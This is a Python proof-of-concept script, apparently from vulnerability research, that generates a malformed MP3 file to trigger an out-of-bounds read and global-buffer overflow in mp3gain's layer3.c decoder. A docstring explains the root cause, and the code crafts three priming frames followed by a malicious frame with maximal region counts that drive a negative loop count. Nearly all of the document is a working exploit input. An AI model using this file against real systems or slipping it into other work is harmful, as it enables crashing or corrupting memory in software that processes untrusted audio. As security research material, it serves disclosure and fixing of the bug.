#!/usr/bin/env python3
"""
VULN 004 PoC Generator for mp3gain
-----------------------------------
Vulnerability: layer3.c bandInfo.longIdx OOB read causes negative loop count
               and hybridIn[] global-buffer overflow.

Root cause:
  struct bandInfoStruct { short longIdx[23]; short longDiff[22]; ... };
  For sfreq=0 (44100Hz), longIdx has indices 0-22 (23 elements).
  At line 403: bandInfo[sfreq].longIdx[r0c+1+r1c+1]
  With r0c=15, r1c=7: index = 15+1+7+1 = 24 (OOB).
  longIdx[23] = longDiff[0] = 4, longIdx[24] = longDiff[1] = 4.
  region2start = 4 >> 1 = 2
  region1start = longIdx[16] >> 1 = 162 >> 1 = 81

  In III_dequantize_sample (line 691-696):
    l[0] = 81
    l[1] = region2start - region1start = 2 - 81 = -79  <-- NEGATIVE
    l[2] = big_values - region2start   = 150 - 2 = 148

  Inner loop (line 899): for(;lp;lp--)  starting at lp=-79
  Runs ~2^32 iterations, writing two doubles per iteration to xrpnt (hybridIn ptr).
  After ~495 iterations into the negative loop, xrpnt overflows hybridIn[2][32][18].
  ASAN detects global-buffer-overflow and aborts.

Trigger conditions:
  - MPEG1, Layer3, 44100Hz, joint stereo (sfreq=0 => 44100Hz)
  - window_switching_flag = 0 (normal block)
  - region0_count = 15 (4-bit max => r0c=15)
  - region1_count = 7 (3-bit max => r1c=7)
  - big_values = 150 (> region1start=81)
"""

import struct
import os


def write_bits(bits_list):
    """Pack list of (value, num_bits) tuples into bytes, MSB-first."""
    result = bytearray()
    current = 0
    count = 0
    for val, nbits in bits_list:
        for i in range(nbits - 1, -1, -1):
            current = (current << 1) | ((val >> i) & 1)
            count += 1
            if count == 8:
                result.append(current)
                current = 0
                count = 0
    if count > 0:
        result.append(current << (8 - count))
    return bytes(result)


def make_frame_header():
    """
    MPEG1 Layer3, no CRC, 128kbps, 44100Hz, no padding, joint stereo, original.
      0xFF = sync high byte
      0xFB = 1111 1011: sync(3b) + MPEG1(11) + Layer3(01) + no_CRC(1)
      0x90 = 1001 0000: bitrate(1001=128k) + samplerate(00=44100) + padding(0) + private(0)
      0x44 = 0100 0100: channel_mode(01=joint_stereo) + mode_ext(00) + copyright(0) + original(1) + emphasis(00)
    """
    return bytes([0xFF, 0xFB, 0x90, 0x44])


def make_malicious_side_info():
    """
    Build 32-byte MPEG1 stereo side info.
    Sets region0_count=15 and region1_count=7 (max values) to trigger OOB.
    big_values=150 ensures we reach the corrupted region with l[1]<0.

    Layout (MPEG1, stereo=2):
      main_data_begin: 9 bits
      private_bits:    3 bits
      scfsi[ch=0]:     4 bits
      scfsi[ch=1]:     4 bits
      (4 x granule-channel blocks in order gr0ch0, gr0ch1, gr1ch0, gr1ch1):
        part2_3_length:      12 bits
        big_values:           9 bits
        global_gain:          8 bits
        scalefac_compress:    4 bits
        window_switching_flag: 1 bit (= 0, normal block)
        table_select[0]:      5 bits
        table_select[1]:      5 bits
        table_select[2]:      5 bits
        region0_count:        4 bits (= 15, MAX)
        region1_count:        3 bits (= 7, MAX)
        preflag:              1 bit
        scalefac_scale:       1 bit
        count1table_select:   1 bit
      Total: 9+3+4+4 + 4*(12+9+8+4+1+5+5+5+4+3+1+1+1) = 20 + 4*59 = 256 bits = 32 bytes
    """
    bits = []
    bits.append((0, 9))    # main_data_begin = 0
    bits.append((0, 3))    # private_bits
    bits.append((0, 4))    # scfsi[ch=0]
    bits.append((0, 4))    # scfsi[ch=1]

    for _gr in range(2):       # granules 0, 1
        for _ch in range(2):   # channels 0, 1
            bits.append((2000, 12))  # part2_3_length = 2000 (ample data bits)
            bits.append((150, 9))    # big_values = 150 (> region1start=81)
            bits.append((200, 8))    # global_gain = 200
            bits.append((0, 4))      # scalefac_compress = 0 (slen0=slen1=0, 0 scf bits)
            bits.append((0, 1))      # window_switching_flag = 0 (NORMAL BLOCK)
            # wsf=0 path:
            bits.append((0, 5))      # table_select[0] = 0 (tab0: all-zeros Huffman)
            bits.append((0, 5))      # table_select[1] = 0
            bits.append((0, 5))      # table_select[2] = 0
            bits.append((15, 4))     # region0_count = 15 (MAX -> r0c=15 -> OOB index 24)
            bits.append((7, 3))      # region1_count = 7  (MAX -> r1c=7  -> OOB index 24)
            bits.append((0, 1))      # preflag = 0
            bits.append((0, 1))      # scalefac_scale = 0
            bits.append((0, 1))      # count1table_select = 0

    side_info = write_bits(bits)
    assert len(side_info) == 32, \
        f"BUG: side info is {len(side_info)} bytes, expected 32"
    return side_info


def make_safe_side_info():
    """
    Safe side info for priming frames: big_values=0, no decoding triggered.
    """
    bits = []
    bits.append((0, 9))    # main_data_begin = 0
    bits.append((0, 3))    # private_bits
    bits.append((0, 4))    # scfsi[ch=0]
    bits.append((0, 4))    # scfsi[ch=1]

    for _gr in range(2):
        for _ch in range(2):
            bits.append((0, 12))     # part2_3_length = 0
            bits.append((0, 9))      # big_values = 0
            bits.append((100, 8))    # global_gain = 100
            bits.append((0, 4))      # scalefac_compress = 0
            bits.append((0, 1))      # window_switching_flag = 0
            bits.append((0, 5))      # table_select[0] = 0
            bits.append((0, 5))      # table_select[1] = 0
            bits.append((0, 5))      # table_select[2] = 0
            bits.append((0, 4))      # region0_count = 0 (safe)
            bits.append((0, 3))      # region1_count = 0 (safe)
            bits.append((0, 1))      # preflag = 0
            bits.append((0, 1))      # scalefac_scale = 0
            bits.append((0, 1))      # count1table_select = 0

    side_info = write_bits(bits)
    assert len(side_info) == 32
    return side_info


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(out_dir, 'vuln_004.mp3')

    # MPEG1 Layer3 128kbps 44100Hz no padding:
    # frame_length = floor(144 * 128000 / 44100) = floor(417.959...) = 417
    FRAME_LEN = 417
    HEADER_LEN = 4
    SIDE_INFO_LEN = 32
    DATA_LEN = FRAME_LEN - HEADER_LEN - SIDE_INFO_LEN   # 381 bytes

    header = make_frame_header()
    mal_side = make_malicious_side_info()
    safe_side = make_safe_side_info()

    # Data: 0xFF bytes give bitstream all-ones (for Huffman decoding with tab0, no bits
    # are consumed; xrpnt simply advances by 2 per iteration until overflow)
    mal_data = bytes([0xFF] * DATA_LEN)
    safe_data = bytes(DATA_LEN)  # all zeros for priming frames

    safe_frame = header + safe_side + safe_data
    mal_frame = header + mal_side + mal_data

    assert len(safe_frame) == FRAME_LEN
    assert len(mal_frame) == FRAME_LEN

    with open(output_path, 'wb') as f:
        # 3 priming frames to initialise the bitstream reservoir
        for _ in range(3):
            f.write(safe_frame)
        # Malicious frame -- triggers OOB read -> l[1]=-79 -> infinite loop
        f.write(mal_frame)

    total = os.path.getsize(output_path)
    print(f"[+] Written: {output_path} ({total} bytes, 4 frames x {FRAME_LEN})")
    print(f"[+] OOB index: r0c+1+r1c+1 = {15+1+7+1} (longIdx has 23 elements, 0-22)")
    print(f"[+] region2start = longDiff[1]>>1 = 4>>1 = 2")
    print(f"[+] region1start = longIdx[16]>>1  = 162>>1 = 81")
    print(f"[+] l[1] = 2 - 81 = -79  (negative => ~2^32 loop iterations)")
    print(f"[+] hybridIn[2][32][18] overflows after ~495 iterations => ASAN fires")


if __name__ == '__main__':
    main()
